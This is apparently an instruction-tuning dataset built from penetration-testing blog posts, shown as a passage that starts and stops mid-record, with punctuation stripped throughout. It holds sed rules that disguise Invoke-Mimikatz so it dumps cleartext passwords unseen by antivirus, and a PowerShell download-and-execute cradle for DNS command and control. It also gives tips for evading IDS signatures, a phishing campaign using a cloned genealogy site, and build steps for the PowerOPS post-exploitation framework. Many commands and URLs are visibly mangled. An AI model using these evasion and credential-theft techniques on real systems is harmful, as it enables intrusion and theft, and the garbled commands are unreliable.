three more match and replace rules and Winner winner chicken dinner The complete list of match and replace commands is listed below sed -i -e 's Invoke-Mimikatz Invoke-Mimidogz g Invoke-Mimikatz.ps1 sed -i -e c Invoke-Mimikatz.ps1 sed -i -e 's space g Invoke-Mimikatz.ps1 sed -i -e 's DumpCreds DumpCred g Invoke-Mimikatz.ps1 sed -i -e 's ArgumentPtr NotTodayPal g Invoke-Mimikatz.ps1 sed -i -e 's CallDllMainSC1 ThisIsNotTheStringYouAreLookingFor g Invoke-Mimikatz.ps1 sed -i -e s -Win32Functions Win32Functions -Win32Functions Win32Functions g Invoke-Mimikatz.ps1 No AV Detection After Match and Replace Rules We took this modified Mimikatz file and ran it against systems running up-to-date versions of Windows Defender Symantec and ESET Thanks to Brian Fehrman and David Fletcher We were able to run the script to dump cleartext passwords from memory and it was not detected by AV Modified Mimikatz Script Still Functional We successfully modified the Mimikatz script to avoid AV detection without changing the functionality Great evidence to why you should not rely solely on your AV for protection This post is part of the bigger Sacred Cash Cow Tipping series about bypassing AV particularly our most recent episode found here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>My Ransomware Post-Mortem</title>\n<taxonomies>Blue Team, backups, be prepared, breach, Christmas delivery phish, good times all around, Oh !@$# moments, Osiris ransomware, ransomware</taxonomies>\n<creation_date>Mon, 09 Jan 2017 17:06:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Cody Smith As information security professionals we're not invincible to breaches Even the most robust security system can't make up for a lack of user education which I was painfully reminded of in December of 2016 My Moment Late one Sunday night I was sitting at my desk working toward an empty inbox when a client of mine called me Hey do you have a minute I can't seem to open my files Sure what's going on Well I can see where my files should be but I can't open anything None of them look like they're supposed to Can you describe what you're seeing All of the file icons look like white pieces of paper and their names are just a bunch of garbled letters with a weird file extension At this point I was quite concerned What does it say Dot Osiris I don't know if I'm saying that right My Response I quickly threw together my typical go-bag for things like this My Apple MacBook Pro a MacBook Air that has been converted into a Kali Linux machine and a couple of flash drives with various distros tools etc On my way to the site I prepared myself to see the worst Maybe this is because of my training as a fireman or maybe it was just my paranoia Nonetheless here is what I was expecting Full propagation throughout the SOHO network Full data-loss on multiple computers Loss of a client However when I got to the business I realized that we weren't as bad off as I had thought While the one user's files were encrypted more on that later the ransomware had only managed to encrypt that computer and no other device on the network was affected So what happened and how did it happen Let's break this down into what went wrong and what went right What Went Wrong In short one thing went wrong I didn't educate the end-user on a recent threat that's been sweeping the internet I didn't educate them on how hackers or skids were using scam-emails to deliver ransomware through Microsoft Office documents That is my fault and mine alone I took responsibility for the breach even though I wasn't the one that caused it Why Because the network's security was my responsibility and as such so was anything that happened to it The user was sent an email similar to ones I've seen in the past It was an email from FedEx claiming that a package couldn't be delivered to the user The plot twist My user was expecting a package that day from FedEx and it wasn't delivered to him I know what's the chance of this happening right Well the user downloaded the file and they joyfully put in their password to the U.A.C prompt when it came up They enabled the Excel document's macros and then the ransomware propagated throughout the computer However unlike other attacks I've read about it didn't propagate throughout the network What Went Right I'm overly paranoid when it comes to security so I had various steps in place to mitigate this threat Clearly I didn't have enough Below I've listed an overview of what went correctly Backups If you've never been on the receiving end of ransomware you probably don't know how grateful you are for backups Unless you own a Seagate hard-drive My client had an effective backup strategy Weekly backups from the computers to the local NAS and from that NAS a weekly upload to an Amazon Web Services S3 Bucket After that backup has sat in the S3 bucket for one week it's transferred over to AWS's Glacier just in case the newest S3 backup has issues Having the most recent backup in S3 allowed for a quick download considering it was a 64GB file that I was able to restore files from the next day Network Drive Segmentation A lot of SOHOs have file-shares and that's okay However if one file-share has access to every computer on the network then you're going to have a bad time However this client's network was segmented in such a way that users only had access to their own drive for cross account sharing a special drive is used with a different username and password than their personal folders Osiris Sucks If you're the author of Osiris we have to have a talk and for a few reasons Your malware didn't encrypt anything with the .jpeg extension Your malware didn't encrypt anything with the .pdf extension Your malware didn't manage to change the background on the computer and it only left 2-3 ransom notes but none on the desktop Your malware didn't leave any .html files but instead .htm files sighs Now don't get me wrong Osiris Ransomware isn't something you want to meet in the wild and you really don't want to meet it like I did when the only post you found about it was two days old However Osiris isn't without its faults What I Could've Done Better I could've had local account policy in place to thwart the ability to run Macros in Office Documents as well as the ability to run anything out of Temp I could've better educated my end users I could have just sent out an email warning my clients of the possibility of them receiving one of the emails like what had caused our breach Lastly I could've tested to see if my faith in my end users was warranted I could've sent them all an email that looked like the email and took note of who actually opened the document and ran the Macros This would have at least allowed me to better see who is aware of what threats What you can do With that said I'd like to leave you with a few easy tips of what you can do to improve your security posture Backups saved my life and they can save your life too It isn't good enough to just have backups Your backups have to work and they have to be current If you haven't checked your backup method in a while do so It can save your rear some day File shares are sometimes a necessary evil but you can greatly reduce the risk if you try to do so Just because someone thinks they need access to a drive doesn't mean they do A simple principle of least access comes in here User education is still the weakest point of any I.T infrastructure and it's also one of the most important domains to make sure you have covered We often overlook user education because users are all idiots that shouldn't be allowed near a computer However while that may be the case it isn't good practice Educate your users and they'll be able to help you far more than you could hope for So with that said I leave you with this Can your network handle this breach _____ Cody Smith is a guest poster He is a Performance Engineer Cyber-Security Junkie and frequently tweets GIFs He spends most of his time attempting to keep up with current trends malware samples threats and vulnerabilities In his spare time likes to browse the web for pictures of Corgis Oh you want to guest post for us too Shoot us a Twitter DM or email us via our contact form"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PowerShell DNS Command & Control with dnscat2-powershell</title>\n<taxonomies>C2, Red Team, C2, DNS C2, dnscat2, PowerShell, tunneling</taxonomies>\n<creation_date>Wed, 11 Jan 2017 18:04:32 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Luke Baggett Imagine a scenario where a Penetration Tester is trying to set up command and control on an internal network blocking all outbound traffic except traffic towards a few specific servers the tester has no access to In this situation there is still a last-ditch option the tester can use that being DNS command and control If you're unfamiliar with DNS command and control the basic idea involves a C2 client sending data inside DNS queries These DNS queries are forwarded across the internet's DNS hierarchy to an authoritative DNS server where the C2 server is located The C2 server then returns data inside the DNS response which is forwarded back to the C2 client DNS must be implemented to allow an internal network to communicate with the Internet in any meaningful way therefore C2 over DNS is highly effective Dnscat2 by Ron Bowes is one of the best DNS tunnel tools around for infosec-related applications DNScat2 supports encryption authentication via pre-shared secrets multiple simultaneous sessions tunnels similar to those in ssh command shells and the most popular DNS query types TXT MX CNAME A AAAA The client is written in C and the server is written in ruby I recently finished implementing all the features of the dnscat2 C client in a PowerShell client available here and included a few extra PowerShell specific features PowerShell is quite common among real-world attackers and penetration testers alike due to its numerous features versatility and the fact it is built in to most Windows systems In this blog post we'll look at how the dnscat2-powershell script can be used Although dnscat2 is designed to travel over DNS servers on the Internet it can also send DNS requests directly to a dnscat2 server which is useful for testing This blog post will only show examples using local connections but you can read about how to set up an authoritative server here Setup Ron Bowes gives a great tutorial on how to install the server in his README for dnscat2 Once the server is ready you can start it like this sudo ruby dnscat2.rb --dns domain test host 192.168.56.1 --no-cache Using the no-cache option is required for the PowerShell client to work correctly due to the fact that the nslookup command uses sequential DNS transaction ID values that are not initially randomized A Windows machine with PowerShell version 2.0 or later installed is required to use dnscat2-Powershell The dnscat2 functions can be loaded by downloading the script and running the following command Import-Module dnscat2.ps1 Alternatively you can paste the following command into PowerShell to enable the dnscat2-powershell functionality IEX New-Object System.Net.Webclient .DownloadString 'aw.githubusercontent.com lukebaggett dnscat2-powershell master dnscat2.ps1 Once the functions are loaded run the following command to start the dnscat2-powershell server Start-Dnscat2 -Domain test -DNSServer 192.168.56.1 Start-Dnscat2 is the name of the main function used in dnscat2-powershell that allows clients to establish a command session with the server From the server you can now direct the client to perform different actions Here's a video that shows what this looks like embed outu.be IFmQsgxkcvs embed If you don't want to use a command session you can use the -Exec -ExecPS or -Console parameters for Start-Dnscat2 PowerShell Features Extra PowerShell-related features have been added to dnscat2-powershell command session For example you can simulate an interactive PowerShell session by typing the following command exec psh You may also pass the -ExecPS switch to Start-Dnscat2 to enable this feature The client will take input from the server pass it to Invoke-Expression and return the output Variables are preserved throughout the client's lifespan This allows the usage of awesome PowerShell tools such as PowerSploit Scripts can be loaded into memory on the client over DNS by typing the following command upload tmp script.ps1 hex var The hex representation of the file will be placed into the var variable From there the hex can be converted to a string and loaded as a PowerShell function Similarly typing the following command upload bytes var tmp var will download a byte array stored in var and write it to tmp var At the moment these two features are new and buggy and are more reliable with smaller scripts In the video below a simulated PowerShell session is shown as well as how you can load other PowerShell scripts via DNS The example script is Get-Keystrokes part of Powersploit embed outu.be Th83OmLiQN8 embed Encryption By default all traffic is encrypted This can be turned off by passing -NoEncryption to Start-Dnscat2 and starting the server with following command option -e open Without encryption all dnscat2 packets are simply hex encoded making it fairly simple for people who know the dnscat2 protocol to reassemble the data Authentication with a pre-shared secret can be used to prevent man in the middle by passing a password to -PreSharedSecret on the client and the c option on the server Tunnels Dnscat2 supports tunnels similar to SSH Local Port forwarding The dnscat2 server listens on a local port and any connection to that port are forwarded through the DNS tunnel and the dnscat2 client forwards the connection to a port on another host One scenario where this comes in handy is when the dnscat2 client is on an internal network with an SSH server By setting up a tunnel from a port on the server to the SSH server on the internal network you can achieve an interactive SSH session over DNS The below video shows how this is done embed outu.be gh03CpaUxbQ embed Avoiding Detection by generic signatures There are many ways to detect DNS tunnels Checking the query length of outbound DNS queries monitoring the frequency of DNS queries from specific hosts and checking for specific uncommon query types are a few examples A static or random delay can be added between each request the client sends by using -Delay and -MaxRandomDelay with Start-Dnscat2 The delay can be changed from a command session by typing the following command delay This can help avoid detection by systems using frequency based analysis It's useful for a DNS tunnel to use the maximum length of a DNS query to transfer data faster Yet how often is a legitimate user going to be sending maximum length DNS queries A signature could be written based on queries using the precise maximum length of a query If you want to be slightly more stealthy you can shorten your maximum request size with the -MaxPacketSize parameter Many DNS tunnels will use TXT CNAME or MX queries due to the simplicity of processing their responses and their long response length These aren't the most common query types so an IDS may alert on the high frequency of these queries A and AAAA queries are much more expected so using them may help you slip past IDS detection The -LookupTypes parameter for Start-Dnscat2 can be used to pass a list of valid query types to the client The client will randomly select a query type from this list for each DNS query it sends Using all three of these options makes writing a good signature for dnscat2 slightly more complicated A video below shows all of these options combined and how modifying the options noticeably impacts data transfer speed embed outu.be VrA8cyrssos embed Conclusion Tunneling your communications through DNS has some real practical advantages Primarily providing a shell in environments with even the most extreme outbound traffic filtering The major downside is the slow speeds involved with forwarding all your traffic through the internet's DNS servers Now with a PowerShell version of the dnscat2 client penetration testers can easily use DNS-based C2 alongside familiar PowerShell tools"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Android Dev & Penetration Testing Setup - Part 1</title>\n<taxonomies>Author, Joff Thyer, Mobile, Red Team, Android, Android Dev, mobile apps, Pentesting, pentesting mobile apps</taxonomies>\n<creation_date>Tue, 17 Jan 2017 18:07:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Editor's Note This is part 1 of a 3 part series Part 1 will discuss configuring your virtual machine engine and virtual hardware emulation Part 2 covers installing Android for the emulator and Part 3 covers installing the drozer attack framework _______ If you're planning to test mobile apps on Android then you'll need a suitable environment setup with the correct development tools Android emulation and the drozer security and attack framework This blog post will walk through the steps to correctly configure an Ubuntu 16.04 system to engage in both penetration testing and development with Android apps A word of warning on this documented procedure several hundred megabytes of data will need to be downloaded from the internet thus if you are trying to do this at a hotel or public Wi-Fi spot I suspect you will be quite disappointed Make sure you are connected to at least 10 Mbps downstream You have a choice of using a physical or virtual machine This post will focus on creating a virtual machine with VMware Fusion on OSX Be aware that there are significant resource requirements for this project that are dependent on how much RAM you want to devote to the emulator Absolute Minimum VM Resources Required Software Ubuntu 16.04.1 Desktop Hardware 2 GB RAM 2 processor cores 50 GB hard disk Due to the size of the Android studio and emulator installation downloads you will end up with an Ubuntu system using about 30 GB of disk space from day one When the emulator is running it allocates 1 GB of RAM for the memory of the device by default If possible the preferred machine resource configuration should be increased to 4GB RAM and 4CPU cores Start by performing a standard Ubuntu 16.04.1 desktop installation on the virtual machine Since you will be running in a GUI environment the desktop distribution is required Note This installation and test were performed on VMware Fusion version 8.5.3 I have included a screenshot below so you can see the exact release information Configure Virtual Machine Engine and Virtual Hardware Emulation After the installation is complete shut down the Virtual Machine and modify its configuration as follows Change the preferred virtualization engine to Intel VT-x with EPT Perform an edit using your favorite text editor that must be vi of course and add a line into the VMware VMX file to enable hardware-assisted virtualization vhv.enable TRUE This is required in order for the emulator to have any fighting chance of performing decently Now boot up your Ubuntu 16.04.1 VM again and log in as a regular user It is assumed that you will have created an ordinary user account as part of the installation As soon as you log in to the Ubuntu desktop you need to install the cpu-checker package so that we can verify that Kernel Virtual Machine KVM acceleration support is properly recognized by the VM When the package finishes installing run the command kvm-ok as root to perform the check Installing the cpu-checker Package Performing the KVM check Install Oracle Java8 At this point in time we need to install an appropriate version of Java The best option that seemed to work for me was to select the latest Oracle Java package In order to do this you need to add a new repository and then install the Java package The actual terminal commands you need are as follows sudo apt-add-repository ppa webupd8team java sudo apt update sudo apt install oracle-java8-installer During the Oracle Java8 installation you will also need to accept the Oracle binary license After installing Oracle Java 8 you are ready to begin the Android studio development software and Android emulator installation Editor's Note Remember this is Part 1 of 3 Part 2 Installing Android for the Emulator is here Check out Part 3 here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Android Dev & Penetration Testing Setup  Part 2: Installing Android Studio</title>\n<taxonomies>Author, Joff Thyer, Mobile, Red Team, Android, Android Dev, mobile apps, Pentesting</taxonomies>\n<creation_date>Fri, 20 Jan 2017 15:05:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Editor's Note This is part 2 of a 3 part series Part 1 discussed configuring your virtual machine engine and virtual hardware emulation Part 2 this part covers installing Android for the emulator and Part 3 covers installing the drozer attack framework After the Java installation has finished you will need to visit the Android Studio download page and install the latest Linux version of Android Studio Visit eveloper.android.com and download the Linux package If you use Firefox on the Ubuntu machine itself the download page will look like this When the download finishes make sure you are in your regular unprivileged user home directory and unzip the package cd HOME unzip Downloads android-studio-ide-xxx.yyy.zip Version that was tested for this article At this point we need to run the Android Studio installation exclusively for the reason of obtaining the right software packages to run Android emulation In other words after the installation completes successfully we will just quit Android Studio To start the installation we run the android-studio shell startup script as follows cd HOME adnroid-studio bin studio.sh During the installation much of the software development kit will be downloaded which will be several hundred megabytes of data You should accept all of the default options as this installation takes place Below are the screenshots for your reference Installation Wizard This also confirms that your KVM is working Downloading all of the SDK takes a while The final screen You can now close Android Studio Unfortunately on a 64-bit Ubuntu system there is a small dependency issue which will prevent the Android Virtual Device emulation system from running properly This is because the appropriate C libraries for 32-bit are not installed by default on Ubuntu This is easily remedied with the following recipe of installing the right package and then creating a symbolic link to the needed shared library sudo apt-get install lib64stdc 6 i386 cd Android Sdk tools lib64 libstdc mv libstdc .so.6 libstdc .so.6-OLD ln -s usr lib64 libstdc .so.6 Before proceeding any further you also will need to add the Android Studio tool directories to your PATH statement for the regular user making things MUCH easier to use There are two directories you need to add to the PATH which can be achieved by editing the .profile file then logging out and back in again after changing the PATH Below is a screenshot of the changes made on my system The two directories that must be in your PATH are HOME Android Sdk tools HOME Android Sdk platform-tools Screenshot of .profile file editing Installing Android Version 6.0 for the Emulator Now that you have logged out and back into your Ubuntu system you will need to start up the package management component of Android Studio so that you can download a version of Android and a binary to use for emulation android You should see an opportunity at this stage to install various Android APIs Be careful what you choose these can eat up a lot of hard disk space especially if you choose to emulate the TV and wearable images For this article the screenshot below shows me selecting the Intel images and Android APIs to install To complete the package installation click on install packages After the downloads complete exit this GUI Creating an Emulated Device In order to start up the Android Virtual Device Manager type the command android avd as follows android avd Next we will create an emulated virtual device using the Intel Atom 64-bit image and a Nexus 4 which has only modest memory requirements Click on the Create button to create a new AVD The options we are going to use to create our AVD are as follows Name pentest1 Device Nexus 4 Target Android 6 API Level 23 No skin and Emulated Camera 2048 MB RAM and make sure to select the Use Host GPU button Creating a new AVD If everything is working correctly you should see a popup showing the options that the device was created with You should then see the new device in the list of AVDs on the main screen You can now close this window To check for the list of AVDs in your emulation library you can do this emulator -list-avds pentest1 You should see the new pentest1 AVD that you just created To start the emulator use the command as follows emulator -avd pentest1 If everything goes as planned you should see a nice Android emulator pop up on your screen A Running AVD Emulator _____ Editor's Note Check out Part 3 Installing the drozer Attack Framework"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Android Dev & Penetration Testing Setup  Part 3: Installing the drozer Attack Framework</title>\n<taxonomies>Author, Joff Thyer, Mobile, Red Team</taxonomies>\n<creation_date>Mon, 23 Jan 2017 15:39:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Editor's Note This is part 3 of a 3 part series Part 1 discussed configuring your virtual machine engine and virtual hardware emulation Part 2 covered installing Android for the emulator and this part covers installing the drozer attack framework Once your emulator is up and running it is now time to have some sideloading fun The folks at MWR labs have created an awesome Android attack framework called drozer The framework consists of software that needs to be installed on Ubuntu as well as an APK file that needs to be sideloaded onto your emulated Android First you need to download both the Ubuntu Debian package and the drozer Agent APK files from MWR labs The following screenshots show what you are looking for Debian Ubuntu Package drozer Agent APK file After the downloads are complete perform the Ubuntu Debian package installation first as follows sudo dpkg -i Downloads drozer_2.3.4.deb NOTE this will look like it totally and utterly fails due to dependency problems DON'T PANIC Simply fix it as follows sudo apt install -f Seriously It's that simple Yes This will nicely install all of the required dependencies for you It seems a little backward and counterintuitive but trust me this will work well Here are some screenshots of when I was testing Once all of the dependencies are fixed you can verify whether drozer runs as shown in this screenshot Side-Loading the Drozer Agent APK Now it's time to use our Android emulator to sideload the drozer APK package In addition to this if we have another APK we want to perform penetration testing against we probably want to sideload that APK file as well The first steps are to make sure your emulator is running check access with ADB and sideload packages as needed emulator -avd pentest1 adb devices List of devices attached emulator-5554 device adb install Downloads drozer-agent-2.3.4.apk 100 data local tmp drozer-agent-2.3.4.apk pkg data local tmp drozer-agent-2.3.4.apk Success If all goes as planned you should be able to locate the drozer Agent within your Android App list Drozer Agent Installed In order to use drozer we must start the agent App on the Android emulator and then turn on the embedded server which listens on TCP port 31415 In addition to this we must use ADB to forward the TCP port 31415 to the Android emulator so that we may communicate between the Ubuntu host and the Android drozer Agent After forwarding the TCP communications use the drozer command under Ubuntu to connect to the drozer console Connecting to the Drozer Console At this stage we have a fully operating attack framework and can use many of the reconnaissance scanning and attack commands that drozer provides for us The example below simply lists Android packages on the system The various drozer modules have appropriate help associated with each From a penetration testing perspective you should treat this like any other penetration testing activity meaning you need to perform reconnaissance APK package information gathering of various providers intents broadcast receivers and so forth before starting to exploit some of the inherent weaknesses That should do the trick I hope this prompts another complete set of new learning activities for you There is a tremendous amount of resources about Android basics and architecture that you can obtain by reading the API guides Visit eveloper.android.com for lots more information Happy mobile hunting"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Phishing Family Tree Now: A Social Engineering Odyssey</title>\n<taxonomies>InfoSec 201, Red Team, Social Engineering, Family Tree Now, genealogy, OSINT, phishing, social engineering</taxonomies>\n<creation_date>Thu, 26 Jan 2017 15:26:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joe Gray You may have heard about a new genealogy tool called Family Tree Now It is a seemingly 100 free tool more on that later that allows you to enumerate your family tree without having to enter much data initially beyond your name While it can be useful especially if family reunions are your thing if you're doing a school project or if you're trying to locate relatives the issue here is that you are not the only one that may find it useful As with anything it can be used as a tool or a weapon Just like a hammer the determination comes from intention Below is my analysis and application of the resource My Analysis I went through the Family Tree Now site and analyzed various policies to understand how they operate and what their goals are In the About section they talk about the company and the culture in vague terms This feels like marketing hype so I didn't spend much time there Terms Conditions In the Terms and Conditions link T C section it talks about the uses for the site both authorized and unauthorized This is strange to me as they do not require any authentication to lock users out aside from the presumable ability to block an IP address that is abusive In the T C there is a provision that grants Family Tree Now a copyright on any data input into the system which essentially allows them to copyright YOUR family data In terms see what I did there of use the T C outlines it as such Only for appropriate legal purposes and in compliance with all applicable federal state and local laws and regulations Obtain any and all necessary licenses certificates permits approvals or other authorizations required by federal state or local statute law or regulation that govern your use of the Services Not use the Services in a manner that may cause emotional or physical harm to anyone or to stalk or otherwise harass another person Not use the Services to seek information about or harm minors in any way Not use the Services to seek information about celebrities or public figures Not use the Service to promote or provide instructional information about illegal activities or promote physical harm or injury against any group or individual Not resell any of the information you obtain from the Services without our prior written consent They don't like competition Take reasonable steps to ensure that the information you receive from the Services is stored in a secure manner Privacy In a nutshell they collect information via account registration interactions with features functionality cookies and other technologies we collect your IP address device identifier browser type operating system mobile carrier and your ISP and receive the URLs of sites from which you arrive on our Site and interactions with third party sites This is a very broad collection campaign Back to the whole what who is the product debate The site admits to using the data to administer your account customize the services create and distribute advertising relevant to your experience send you promotional communications through email for internal business purposes analyze trends and statistics for audits to determine the effectiveness of promotional campaigns protect the security or integrity of applications and business and to contact you if necessary To sum up what you can do review and edit information control messages and close your account Notice the term is close not DELETE I guess they forgot about Ashley Madison I'm no lawyer and I possess no formal legal training or expertise but this sounds like we are the product There are few provisions for the security of data collected which is kind of logical for this type of site That is the issue with the model of not requiring a barrier or barriers to entry such as payment or authentication Monetization Monetization is addressed in the privacy policy Ironic Not really If you're not paying for the service or product often you become the product This is sometimes the case even if you do pay so do not let that aspect fool you Michael Bazzell frequently talks about this with Justin Carroll on the Complete Privacy Security Podcast OSINT Angle This is obviously an OSINT treasure chest It includes lots of possibly sensitive information It is publicly available on the internet best of all it's free The only issue is that there is no API and per the T C automated gathering is not permitted From here an attacker can confirm existing data or determine possible relationships to check out This can enable the attacker to penetrate the inner circle of the target using different vectors and angles Social Engineering Angle I have always said that genealogy websites are a hacker's best friend when trying to social engineer beyond ishing and when trying to reset passwords I used to cite Ancestry.com or Genealogy.com as top leads for family oriented attacks with Facebook being a close number 3 You can't keep Mom or Grandma from posting those embarrassing pictures and giving a narrative right In the past few months I have added stick families on back windshields and now Family Tree Now to my arsenal as numbers 1 2 So what can we do with the information we gather from Family Tree Now in Social Engineering attacks This is a near limitless list As with most if not all penetration testing and social engineering engagements time is the limiting factor If you have enough time you can successfully perform Social Engineering on anyone Below is a scenario that I cooked up using Family Tree Now I cloned the website using Social Engineer Toolkit The resulting site is here Notice the difference in it and the REAL site At this point I sprung the phishing email Note that this is not the best email but it is not the worst either Upon clicking Validate the victim would see this Should they choose to opt-out they'll end up here Clicking the link in the top of the email they'll simply see the landing page above Should they provide any information or click any link they end up with a payload Regardless of what they do I am keeping log data which also records any inputs they provide Conclusion In conclusion the attack vector that I outlined is not unique to Family Tree Now The timing of the attack is why I found it interesting Because the site is expected to be asking for intimate and personal information people who end up on the site are more apt to click one way or the other Not having an API slows the attacks down from the perspective of the site I feel like if authentication and or payment were required this would be much more of a non-issue I have been singing the praises of using Ancestry.com for a while This is not really much different than using IntelTechniques or OSINTFramework for gathering OSINT on targets Nor is this much different than Social Media This will work as an excellent tool for validating and confirming the data that has already been gathered and when coupled with the social engineering attack the success rate of any data gathering and payload delivery is amplified __ A Guest post from Joe Gray CISSP-ISSMP GSNA GCIH Joe Gray joined the U.S Navy directly out of High School and served for seven years as a Submarine Navigation Electronics Technician Joe is an Enterprise Security Consultant at Sword Shield Enterprise Security in Knoxville TN Joe also maintains his own Blog and Podcast Advanced Persistent Security He is also in the SANS Instructor Development pipeline teaching SANS Security 504 Hacker Tools Techniques Exploits and Incident Handling In his spare time Joe enjoys reading news relevant to information security attending information security conferences contributing blogs to various outlets bass fishing and flying his drone Follow him on Twitter and see his profile on LinkedIn"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Power Posing with PowerOPS</title>\n<taxonomies>Author, Brian Fehrman, Red Team, Red Team Tools, AV, AV bypass, AV vendors, ESET, Kaspersky, PowerOPS, PowerOPS Frameword, PowerShell, Tipping Cash Cows</taxonomies>\n<creation_date>Wed, 25 Jan 2017 16:13:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman As described in my last blog post Powershell Without Powershell How To Bypass Application Whitelisting Environment Restrictions AV sheeesh it's been a bit we are seeing more environments in which the execution of PowerShell Scripts are being detected or prevented One way around those restrictions is to use a C wrapper program to load the PowerShell scripts and execute them directly in the context of the .NET Framework It is typically the case however that the wrapper has to be modified each time you run a new script At the very least you will likely need to modify some sort of config file that is read by the wrapper This process can be a bit tedious and increases the chances of making a mistake It would be nice to have all of the scripts consolidated into a single compact framework Introducing PowerOPS Framework ithub.com fdiskyou PowerOPS The PowerOPS Framework is the work of numerous people none of whom is me and their names are listed at the bottom of the GitHub page Effectively the framework is a collection of PowerShell scripts that are commonly used during the post-exploitation phase Some of the scripts include PowerView Invoke-Mimikatz Invoke-PSExec and many others Each script is embedded within the C code itself so that you don't need to tote around and load in the scripts All you have to do is compile the code run the executable and enjoy the awesome PowerShell-style interface that enables you to run the script functions with simple commands You can also run normal PowerShell commands from the interface This is all done without actually calling the powershell.exe binary So how do you get going with it Well let's walk through that process now The one caveat is that you will need to have .NET Framework 4.0 or greater installed on the target system For this example I just installed Microsoft Management Framework 4 ww.microsoft.com en-us download details.aspx?id 40855 Next grab down the PowerOPS project from the GitHub link in the first part of this blog post Extract the zip file after the download completes Downloaded and Extracted PowerOPS Project Next open up a command prompt and compile the project by using the following command making sure to change the directory to match the location of your download C Windows Microsoft.NET Framework64 v4.0.30319 csc.exe unsafe reference C Windows Microsoft.Net assembly GAC_MSIL System.Management.Automation v4.0_3.0.0.0__31bf3856ad364e35 System.Management.Automation.dll reference C Windows Microsoft.NET Framework64 v4.0.30319 System.IO.Compression.dll out C users fmc Desktop PowerOPS_x64.exe platform x64 C Users fmc Downloads PowerOPS-master PowerOPS-master PowerOPS .cs Compilation Completed If everything went well you should now have an executable named PowerOPS_x64.exe on your desktop or wherever you decided to put it PowerOPS Binary Note that the command given was to compile for an x64 architecture If you need to target x86 instead use the following command again making sure to change the directory names to match your system C Windows Microsoft.NET Framework v4.0.30319 csc.exe unsafe reference C Windows Microsoft.Net assembly GAC_MSIL System.Management.Automation v4.0_3.0.0.0__31bf 856ad364e35 System.Management.Automation.dll reference C Windows Microsoft.NET Framework v4.0.30319 System.IO.Compression.dll out C users fmc Desktop PowerOPS_x86.exe platform x86 C Users fmc Downloads PowerOPS master PowerOPS-master PowerOPS .cs To run the PowerOPS binary just double-click on it You should be greeted with a command interface PowerOPS Interface You can see a list of the modules that are currently available by typing show into the interface PowerOPS Modules The commands that are present in each module are already imported for you To see which commands are available in a module you can type get-command -module For instance to see the commands for the PowerUp module you would type get-command -module PowerUp Snipper of Commands in PowerView Module Let's go ahead and run the Invoke-AllChecks command by simply typing Invoke-AllChecks Snipper of Commands in PowerView Module What about if a command needs arguments and you can't remember what they are No worries As previously mentioned you can still use normal PowerShell commands in this framework Let's say that we want to run Invoke-ShareFinder but can't quite remember how We can get examples for it by typing the following Get-Help Invoke-ShareFinder -examples Getting 